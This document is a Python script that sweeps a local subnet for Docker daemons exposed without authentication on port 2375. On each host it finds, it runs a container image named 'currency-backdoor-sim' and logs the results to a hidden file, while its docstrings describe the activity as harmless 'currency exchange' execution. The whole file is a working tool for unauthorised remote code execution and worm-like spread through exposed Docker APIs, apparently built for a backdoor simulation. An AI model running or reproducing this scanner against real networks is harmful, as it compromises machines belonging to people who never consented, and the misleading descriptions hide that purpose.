#!/usr/bin/env python3
"""
Simple Remote Docker Execution for Local Network
Execute currency exchange on remote Docker environments in local network.
"""

import subprocess
import sys
import json
from datetime import datetime

def execute_on_remote_docker(remote_ip, docker_port=2376):
    """
    Execute currency exchange on remote Docker daemon via Docker API.
    
    Args:
        remote_ip (str): Remote Docker host IP
        docker_port (int): Docker daemon port (default 2376 for TLS, 2375 for non-TLS)
    """
    
    print(f"[INFO] Connecting to remote Docker: {remote_ip}:{docker_port}")
    
    # Set Docker host environment variable
    docker_host = f"tcp://{remote_ip}:{docker_port}"
    
    # Docker command to run currency exchange
    docker_cmd = [
        "docker", 
        "-H", docker_host,
        "run", "--rm", 
        "currency-backdoor-sim", 
        "python", "-c", 
        "import currency_exchange; print('Remote Docker execution completed')"
    ]
    
    print(f"[CMD] {' '.join(docker_cmd)}")
    
    try:
        # Execute remote Docker command
        result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode == 0:
            print(f"[SUCCESS] Remote Docker execution completed")
            print(f"[OUTPUT] {result.stdout.strip()}")
            log_execution(remote_ip, "SUCCESS", result.stdout.strip())
        else:
            print(f"[ERROR] Remote Docker execution failed: {result.stderr}")
            log_execution(remote_ip, "FAILED", result.stderr.strip())
            
    except subprocess.TimeoutExpired:
        print(f"[ERROR] Remote Docker execution timeout")
        log_execution(remote_ip, "TIMEOUT", "Command timed out")
    except Exception as e:
        print(f"[ERROR] Remote Docker connection failed: {e}")
        log_execution(remote_ip, "CONNECTION_FAILED", str(e))

def execute_on_local_network(network_range="192.168.1"):
    """
    Scan local network and execute on available Docker hosts.
    
    Args:
        network_range (str): Network range to scan (e.g., "192.168.1")
    """
    
    print(f"[INFO] Scanning network range: {network_range}.1-254")
    
    # Common Docker hosts in local network
    docker_hosts = [
        f"{network_range}.100",  # Common Docker host IP
        f"{network_range}.101",
        f"{network_range}.102",
        f"{network_range}.200",
        f"{network_range}.201"
    ]
    
    for host in docker_hosts:
        print(f"\n[SCAN] Checking {host}...")
        
        # Try to ping first
        ping_cmd = ["ping", "-n", "1", "-w", "1000", host] if sys.platform == "win32" else ["ping", "-c", "1", "-W", "1", host]
        
        try:
            ping_result = subprocess.run(ping_cmd, capture_output=True, text=True, timeout=5)
            if ping_result.returncode == 0:
                print(f"[PING] {host} is reachable")
                
                # Try Docker connection
                try:
                    docker_check = subprocess.run([
                        "docker", "-H", f"tcp://{host}:2375", "version"
                    ], capture_output=True, text=True, timeout=5)
                    
                    if docker_check.returncode == 0:
                        print(f"[DOCKER] {host} has Docker daemon available")
                        execute_on_remote_docker(host, 2375)
                    else:
                        print(f"[DOCKER] {host} Docker daemon not accessible")
                        
                except Exception as e:
                    print(f"[DOCKER] {host} Docker check failed: {e}")
            else:
                print(f"[PING] {host} not reachable")
                
        except Exception as e:
            print(f"[ERROR] Network check failed for {host}: {e}")

def log_execution(remote_host, status, output):
    """Log remote execution to local file."""
    try:
        with open(".remote_execution.log", "a", encoding="utf-8") as f:
            timestamp = datetime.now().isoformat()
            log_entry = f"{timestamp} - Remote Docker | Host: {remote_host} | Status: {status} | Output: {output}\n"
            f.write(log_entry)
        print(f"[LOG] Execution logged to .remote_execution.log")
    except Exception as e:
        print(f"[ERROR] Failed to log: {e}")

def main():
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} <remote_ip>              # Execute on specific remote Docker host")
        print(f"  {sys.argv[0]} --scan [network_range]   # Scan local network for Docker hosts")
        print()
        print("Examples:")
        print(f"  {sys.argv[0]} 192.168.1.100")
        print(f"  {sys.argv[0]} --scan 192.168.1")
        print(f"  {sys.argv[0]} --scan 10.0.0")
        return
    
    if sys.argv[1] == "--scan":
        network_range = sys.argv[2] if len(sys.argv) > 2 else "192.168.1"
        execute_on_local_network(network_range)
    else:
        remote_ip = sys.argv[1]
        execute_on_remote_docker(remote_ip)

if __name__ == "__main__":
    main()
